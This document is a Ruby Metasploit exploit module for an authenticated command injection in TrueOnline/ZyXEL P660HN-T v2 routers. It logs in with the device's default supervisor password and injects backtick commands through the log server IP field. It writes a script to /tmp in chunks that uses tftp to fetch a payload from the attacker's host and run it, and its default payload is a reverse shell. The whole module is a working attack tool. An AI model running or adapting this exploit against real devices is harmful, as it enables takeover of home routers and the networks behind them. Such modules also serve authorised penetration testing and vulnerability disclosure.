# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;TrueOnline / ZyXEL P660HN-T v2 Router Authenticated Command Injection&#039;,
      &#039;Description&#039;    => %q{
        TrueOnline is a major ISP in Thailand, and it distributes a customised version of
        the ZyXEL P660HN-T v2 router. This customised version has an authenticated command injection
        vulnerability in the remote log forwarding page. This can be exploited using the "supervisor"
        account that comes with a default password on the device.
        This module was tested in an emulated environment, as the author doesn&#039;t have access to the
        Thai router any more. Any feedback should be sent directly to the module&#039;s author, as well as
        to the Metasploit project. Note that the inline payloads work best.
        There are Turkish and other language strings in the firmware, so it is likely that this
        firmware is not only distributed in Thailand. Other P660HN-T v2 in other countries might be
        vulnerable too.
      },
      &#039;Author&#039;         =>
        [
          &#039;Pedro Ribeiro <pedrib@gmail.com>&#039;         # Vulnerability discovery and Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2017/Jan/40&#039;],
          [&#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt&#039;],
          [&#039;URL&#039;, &#039;https://blogs.securiteam.com/index.php/archives/2910&#039;]
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;P660HN-T v2&#039;, {}],
        ],
      &#039;Privileged&#039;     => true,
      &#039;Arch&#039;           => ARCH_MIPSBE,
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;linux/mipsbe/shell_reverse_tcp&#039; },
      &#039;DisclosureDate&#039;  => &#039;Dec 26 2016&#039;,
      &#039;DefaultTarget&#039;   => 0))
    register_options(
      [
        Opt::RPORT(80),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;Username for the web interface (using default credentials)&#039;, &#039;supervisor&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password for the web interface (using default credentials)&#039;, &#039;zyad1234&#039;]),
        OptAddress.new(&#039;LHOST&#039;, [ true, &#039;The listen IP address from where the victim downloads the MIPS payload&#039; ]),
        OptInt.new(&#039;DELAY&#039;, [true, "How long to wait for the device to download the payload", 30]),
      ], self.class)
  end

  def check
    res = send_request_cgi!({
      &#039;uri&#039;     => &#039;/js/Multi_Language.js&#039;,
      &#039;method&#039;  => &#039;GET&#039;
    })
    if res && res.body =~ /P-660HN-T1A_IPv6/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unknown
    end
  end

  def send_cmd(cmd)
     res = send_request_cgi({
        &#039;uri&#039;     => &#039;/cgi-bin/pages/maintenance/logSetting/logSet.asp&#039;,
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;cookie&#039;  => "SESSIONID=#{@cookie}",
        &#039;vars_post&#039; => {
          &#039;logSetting_H&#039; => &#039;1&#039;,
          &#039;active&#039;       => &#039;1&#039;,
          &#039;logMode&#039;      => &#039;LocalAndRemote&#039;,
          &#039;serverPort&#039;   => rand_text_numeric(3),
          # we have a short space for the payload - only 28 chars!
          &#039;serverIP&#039;     => "1.1.1.1`#{cmd}`&#",
        }
      })

    if res && res.code == 200
      return true
    else
      return false
    end
  end


  def exploit
    # first we authenticate
    @cookie = rand_text_alpha_lower(7)

    res = send_request_cgi({
      &#039;uri&#039;     => &#039;/cgi-bin/index.asp?&#039; + Rex::Text.encode_base64("#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}"),
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;cookie&#039;  => "SESSIONID=#{@cookie}",
      &#039;vars_post&#039; => {
        &#039;Loginuser&#039; => &#039;supervisor&#039;,
        &#039;Prestige_Login&#039; => &#039;Login&#039;
      }
    })

    if res && res.code == 200
      print_good("#{peer} - Successfully authenticated to the web interface.")
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate to the web interface.")
    end

    #this filename is used to store the payload on the device -> the fewer chars the better!
    filename = rand_text_alpha_lower(5)

    # while echo&#039;ing the payload, we can only send 10 chars at a time (see advisory for details)
    exec_file = &#039;/tmp/&#039; + rand_text_alpha_lower(1)
    script_file = %{#!/bin/sh
cd /tmp;tftp -g -r #{filename} #{datastore[&#039;LHOST&#039;]};chmod +x /tmp/#{filename};sleep 5;/tmp/#{filename} &}

    counter = 10
    res = send_cmd("echo -n \"#{script_file[0..counter]}\">#{exec_file}")
    if not res
      fail_with(Failure::Unknown, "#{peer} - Failed to inject payload.")
    end

    while counter+1 < script_file.length
      if (counter + 10) > script_file.length
        ending = script_file.length - 1
      else
        ending = counter + 10
      end

      print_status("#{peer} - Successfully injected part of the payload, waiting 5 seconds before proceeding.")
      sleep 5

      send_cmd("echo -n \"#{script_file[counter+1..ending]}\">>#{exec_file}")
      if not res
        fail_with(Failure::Unknown, "#{peer} - Failed to inject payload.")
      end

      counter += (ending - counter)
    end

    print_good("#{peer} - Injection finished!")
    @pl = generate_payload_exe

    #
    # start our server
    #
    print_status("#{peer} - Starting up our TFTP service")
    @tftp = Rex::Proto::TFTP::Server.new
    @tftp.register_file(filename,@pl,true)
    @tftp.start

    #
    # download payload
    #
    print_status("#{peer} - Asking the device to download and execute the payload")

    # these two commands have to be 15 chars or less!
    send_cmd("chmod +x #{exec_file}")
    send_cmd("#{exec_file} &")

    # wait for payload download
    wait_linux_payload
    @tftp.stop
    register_file_for_cleanup("/tmp/#{filename}")
    register_file_for_cleanup("#{exec_file}")
    sleep 10
    handler
  end

  def wait_linux_payload
    print_status("#{peer} - Waiting for the victim to request the ELF payload...")
    waited = 0
    while (not @tftp.files.length == 0)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore[&#039;DELAY&#039;])
        @tftp.stop
        fail_with(Failure::Unknown, "#{peer} - Target didn&#039;t request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
    print_good("#{peer} - Payload was downloaded, wait for shell!")
  end
end

